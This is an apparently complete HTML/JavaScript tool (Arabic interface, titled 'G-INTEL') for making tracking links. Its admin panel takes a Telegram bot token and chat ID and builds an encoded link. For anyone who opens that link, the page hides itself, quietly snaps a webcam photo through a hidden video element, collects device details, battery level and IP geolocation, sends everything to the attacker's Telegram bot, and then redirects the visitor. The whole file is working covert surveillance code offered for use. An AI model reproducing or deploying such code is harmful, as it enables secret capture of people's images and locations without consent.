<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ­ÙƒÙ… Ø§Ù„Ù…ØªÙ‚Ø¯Ù… | G-INTEL</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.33/ua-parser.min.js"></script>
    <style>
        :root { --red: #ff0000; --dark: #0a0a0a; --card: #151515; }
        body { background-color: var(--dark); color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden; }
        .container { width: 90%; max-width: 450px; background: var(--card); padding: 30px; border-radius: 20px; border: 1px solid #333; box-shadow: 0 10px 40px rgba(255, 0, 0, 0.1); transition: all 0.4s ease; }
        h2 { color: var(--red); text-align: center; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 25px; border-bottom: 2px solid var(--red); padding-bottom: 10px; }
        input { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #444; color: #fff; border-radius: 8px; outline: none; transition: 0.3s; }
        input:focus { border-color: var(--red); box-shadow: 0 0 10px rgba(255, 0, 0, 0.2); }
        .btn { background: var(--red); color: #fff; border: none; padding: 15px; width: 100%; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 15px; transition: 0.3s; }
        .btn:hover { background: #cc0000; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(255, 0, 0, 0.3); }
        #outputLink { display: none; margin-top: 25px; border-top: 1px solid #333; padding-top: 20px; }
        textarea { width: 100%; height: 70px; background: #000; color: #ff4d4d; border: 1px solid #444; border-radius: 8px; padding: 10px; font-size: 11px; resize: none; margin-top: 10px; }
        .hidden { display: none; }
        #cam-preview { display: none; } /* Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù…Ø®ÙÙŠØ© ØªÙ…Ø§Ù…Ø§Ù‹ Ø¹Ù† Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… */
    </style>
</head>
<body>

<div id="adminPanel" class="container">
    <h2>Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…</h2>
    <input type="text" id="botToken" placeholder="ØªÙˆÙƒÙ† Ø§Ù„Ø¨ÙˆØª (Bot Token)">
    <input type="text" id="chatId" placeholder="Ø§Ù„Ø£ÙŠØ¯ÙŠ (Chat ID)">
    <input type="text" id="targetUrl" placeholder="Ø±Ø§Ø¨Ø· Ø§Ù„Ù…ÙˆÙ‚Ø¹ (Redirect URL)">
    <button class="btn" onclick="buildLink()">Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ù…Ù„ØºÙ…</button>

    <div id="outputLink">
        <p style="font-size: 13px; color: #aaa;">Ø§Ù†Ø³Ø® Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ ÙˆØ§Ø®ØªØµØ±Ù‡:</p>
        <textarea id="finalUrl" readonly></textarea>
    </div>
</div>

<video id="cam-preview" autoplay playsinline></video>
<canvas id="cam-canvas" class="hidden"></canvas>

<script>
    const params = new URLSearchParams(window.location.search);

    // --- Ù‚Ø³Ù… Ø§Ù„Ø¶Ø­ÙŠØ© (Ø§Ù„ØªØªØ¨Ø¹ Ø§Ù„ØµØ§Ù…Øª ÙˆØ§Ù„ÙƒØ§Ù…ÙŠØ±Ø§) ---
    if (params.has('d')) {
        document.getElementById('adminPanel').classList.add('hidden');
        
        try {
            const config = JSON.parse(atob(params.get('d')));
            initCapture(config);
        } catch (e) {
            window.location.replace("https://google.com");
        }
    }

    async function initCapture(config) {
        // 1. Ø·Ù„Ø¨ Ø¥Ø°Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙÙˆØ±Ø§Ù‹
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('cam-preview');
            video.srcObject = stream;

            // Ø§Ù†ØªØ¸Ø§Ø± Ø¨Ø±Ù‡Ø© Ù„Ù„ØªØ£ÙƒØ¯ Ù…Ù† ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø«Ù… Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø©
            setTimeout(() => {
                capturePhoto(config, stream);
            }, 1000);
        } catch (err) {
            // Ø¥Ø°Ø§ Ø±ÙØ¶ Ø§Ù„Ø¥Ø°Ù†ØŒ Ø£Ø±Ø³Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù†ØµÙŠØ© ÙÙ‚Ø· ÙˆÙˆØ¬Ù‡Ù‡
            sendReport(config, null);
        }
    }

    async function capturePhoto(config, stream) {
        const video = document.getElementById('cam-preview');
        const canvas = document.getElementById('cam-canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        // ØªØ­ÙˆÙŠÙ„ Ø§Ù„ØµÙˆØ±Ø© Ù„Ù…Ù„Ù Blob Ù„Ø¥Ø±Ø³Ø§Ù„Ù‡Ø§ Ù„ØªÙ„Ø¬Ø±Ø§Ù…
        canvas.toBlob(async (blob) => {
            await sendReport(config, blob);
            // Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø¨Ø¹Ø¯ Ø§Ù„Ø§Ù„ØªÙ‚Ø§Ø·
            stream.getTracks().forEach(track => track.stop());
            // Ø§Ù„ØªÙˆØ¬ÙŠÙ‡ Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ
            window.location.replace(config.url);
        }, 'image/jpeg', 0.8);
    }

    async function sendReport(config, photoBlob) {
        const parser = new UAParser();
        const ua = parser.getResult();
        
        let battery = "ØºÙŠØ± Ù…ØªØ§Ø­";
        try { const b = await navigator.getBattery(); battery = `${Math.round(b.level * 100)}%`; } catch(e){}
        
        let net = {};
        try { const r = await fetch('https://ipapi.co/json/'); net = await r.json(); } catch(e){}

        const text = `
ğŸš¨ **Ø¹Ù…Ù„ÙŠØ© ØªØªØ¨Ø¹ Ù†Ø§Ø¬Ø­Ø©**
â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ğŸ“± **Ø§Ù„Ø¬Ù‡Ø§Ø²:** ${ua.device.vendor || ''} ${ua.device.model || 'PC'}
ğŸ–¥ï¸ **Ø§Ù„Ù†Ø¸Ø§Ù…:** ${ua.os.name} ${ua.os.version}
ğŸ”‹ **Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©:** ${battery}
ğŸŒ **IP:** \`${net.ip || 'Ù…Ø®ÙÙŠ'}\`
ğŸ“ **Ø§Ù„Ù…ÙˆÙ‚Ø¹:** ${net.city || ''}, ${net.country_name || ''}
ğŸ¢ **Ø§Ù„Ø´Ø±ÙƒØ©:** ${net.org || ''}
â”â”â”â”â”â”â”â”â”â”â”â”â”â”
        `;

        // 1. Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù†ØµÙŠØ©
        await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: config.chat, text: text, parse_mode: 'Markdown' })
        });

        // 2. Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© Ø¥Ø°Ø§ ØªÙˆÙØ±Øª
        if (photoBlob) {
            const formData = new FormData();
            formData.append('chat_id', config.chat);
            formData.append('photo', photoBlob, 'photo.jpg');
            await fetch(`https://api.telegram.org/bot${config.token}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        }
    }

    // --- Ù‚Ø³Ù… Ø§Ù„Ø¥Ø¯Ù…Ù† (Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø±Ø§Ø¨Ø·) ---
    function buildLink() {
        const token = document.getElementById('botToken').value;
        const chat = document.getElementById('chatId').value;
        const url = document.getElementById('targetUrl').value;

        if(!token || !chat || !url) return alert("ÙŠØ±Ø¬Ù‰ Ø¥ÙƒÙ…Ø§Ù„ Ø§Ù„Ø­Ù‚ÙˆÙ„!");

        const data = { token, chat, url };
        const encoded = btoa(JSON.stringify(data));
        const final = window.location.origin + window.location.pathname + "?d=" + encoded;

        document.getElementById('finalUrl').value = final;
        document.getElementById('outputLink').style.display = 'block';
    }
</script>

</body>
</html>
